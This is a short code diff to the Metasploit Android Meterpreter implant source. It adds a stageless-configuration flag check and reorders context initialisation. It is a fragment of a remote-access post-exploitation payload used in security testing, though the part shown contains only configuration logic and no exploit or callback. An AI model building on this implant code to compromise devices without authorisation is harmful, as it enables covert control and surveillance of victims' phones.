@@ -9,6 +9,8 @@ import com.metasploit.meterpreter.android.*;
 import com.metasploit.meterpreter.android.stdapi_ui_desktop_screenshot;
 import com.metasploit.meterpreter.stdapi.*;
 
+import com.metasploit.stage.Config;
+
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.OutputStream;
@@ -76,12 +78,10 @@ public class AndroidMeterpreter extends Meterpreter {
         super(in, rawOut, true, redirectErrors, false);
         writeableDir = (String)parameters[0];
         byte[] config = (byte[]) parameters[1];
-        try {
-            findContext();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        if (config != null && config[0] != 0) {
+
+        boolean stageless = (config != null && (config[0] & Config.FLAG_STAGELESS) != 0);
+
+        if (stageless) {
             loadConfiguration(in, rawOut, config);
         } else {
             int configLen = in.readInt();
@@ -89,6 +89,12 @@ public class AndroidMeterpreter extends Meterpreter {
             in.readFully(configBytes);
             loadConfiguration(in, rawOut, configBytes);
             this.ignoreBlocks = in.readInt();
+        }
+
+        try {
+            findContext();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
 
         this.intervalCollectionManager = new IntervalCollectionManager(getContext());
